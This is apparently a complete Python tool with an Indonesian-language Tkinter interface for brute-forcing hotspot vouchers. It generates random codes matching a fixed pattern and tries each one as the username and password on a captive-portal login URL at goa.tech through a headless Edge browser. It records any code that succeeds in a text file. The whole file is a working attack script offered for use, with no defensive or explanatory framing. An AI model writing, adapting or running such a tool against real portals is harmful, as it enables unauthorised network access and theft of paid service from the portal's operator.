import random
import string
import time
from datetime import datetime
from tkinter import *
from selenium import webdriver
from selenium.webdriver.edge.options import Options
from selenium.webdriver.edge.service import Service as EdgeService

# ========= GLOBAL FLAG UNTUK STOP =========
stop_flag = False

# ========= GENERATE VOUCHER =========
def generate_voucher():
    huruf = string.ascii_lowercase
    angka = string.digits
    return "k5" + ''.join(random.choices(huruf, k=2)) + ''.join(random.choices(angka, k=2))

# ========= CEK VOUCHER DENGAN EDGE =========
def try_login_with_url(voucher_code):
    login_url = f"http://goa.tech/login?dst=http://www.msftconnecttest.com/redirect&popup=true&username={voucher_code}&password={voucher_code}"

    options = Options()
    options.add_argument("--headless")
    options.add_argument("--disable-gpu")

    try:
        driver = webdriver.Edge(options=options)
        driver.get(login_url)
        time.sleep(5)

        current_url = driver.current_url
        driver.quit()

        if "status" in current_url:
            return True
        return False
    except Exception as e:
        print("Error:", e)
        return False

# ========= FUNGSI MULAI BRUTE FORCE =========
def start_bruteforce():
    global stop_flag
    stop_flag = False  # Reset saat tombol start ditekan
    log_text.delete(1.0, END)
    for i in range(1000):
        if stop_flag:
            log_text.insert(END, "⛔ Proses dihentikan oleh pengguna.\n")
            break

        voucher = generate_voucher()
        log_text.insert(END, f"[{i+1}] Mencoba: {voucher}...\n")
        log_text.see(END)
        root.update()

        if try_login_with_url(voucher):
            log_text.insert(END, f"✅ VALID: {voucher}\n")
            with open("valid_voucher.txt", "a") as f:
                f.write(f"{voucher} | {datetime.now()}\n")
            break
        else:
            log_text.insert(END, f"❌ Invalid: {voucher}\n")

# ========= FUNGSI STOP =========
def stop_bruteforce():
    global stop_flag
    stop_flag = True

# ========= FUNGSI LIHAT VOUCHER =========
def lihat_voucher():
    log_text.delete(1.0, END)
    try:
        with open("valid_voucher.txt", "r") as f:
            log_text.insert(END, f.read())
    except FileNotFoundError:
        log_text.insert(END, "Belum ada voucher valid.\n")

# ========= GUI TKINTER =========
root = Tk()
root.title("Brute Force Voucher - Edge")
root.geometry("550x480")

btn_start = Button(root, text="Mulai Brute Force", command=start_bruteforce, bg="#28a745", fg="white", width=40)
btn_start.pack(pady=10)

btn_stop = Button(root, text="STOP", command=stop_bruteforce, bg="#dc3545", fg="white", width=40)
btn_stop.pack(pady=5)

btn_lihat = Button(root, text="Lihat Voucher Valid", command=lihat_voucher, bg="#007bff", fg="white", width=40)
btn_lihat.pack(pady=5)

log_text = Text(root, height=20, width=70, bg="#f8f9fa")
log_text.pack(pady=10)

root.mainloop()
